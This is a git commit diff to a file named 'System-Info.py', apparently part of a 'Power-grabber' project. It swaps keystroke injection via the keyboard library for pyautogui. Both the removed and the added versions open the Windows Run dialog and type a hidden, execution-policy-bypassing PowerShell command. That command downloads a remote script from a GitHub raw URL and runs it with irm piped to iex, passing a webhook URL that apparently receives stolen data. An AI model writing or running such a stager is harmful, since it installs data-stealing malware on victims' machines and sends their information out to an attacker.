622aa378a2d0a09ba3cd0829cd4ef90a55b99ae4
Powercascade <powercascade28@gmail.com>
2025-01-10 21:17:30 -0600

    System-Info.py

--- Options/System-Info.py
+++ Options/System-Info.py
@@ -4,16 +4,12 @@ import subprocess
 def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 try:
-    import keyboard
+    import pyautogui
 except ImportError:
-    install("keyboard")
-    import keyboard
-def type_text(text):
-    for char in text:
-        keyboard.press_and_release(char)
-time.sleep(1)
-keyboard.press_and_release("win+r")
-time.sleep(0.01)
-command = f"powershell -NoP -Ep Bypass -W H -C $dc='{webhook_url}'; irm https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/taktikal | iex"
-type_text(command)  
-keyboard.press_and_release("enter")
+    install('pyautogui')
+    import pyautogui
+time.sleep(0.1)
+pyautogui.hotkey('win', 'r')
+time.sleep(0.1)
+pyautogui.write(f"powershell -NoP -Ep Bypass -W H -C $dc='{webhook_url}'; irm https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/taktikal | iex")
+pyautogui.press('enter')
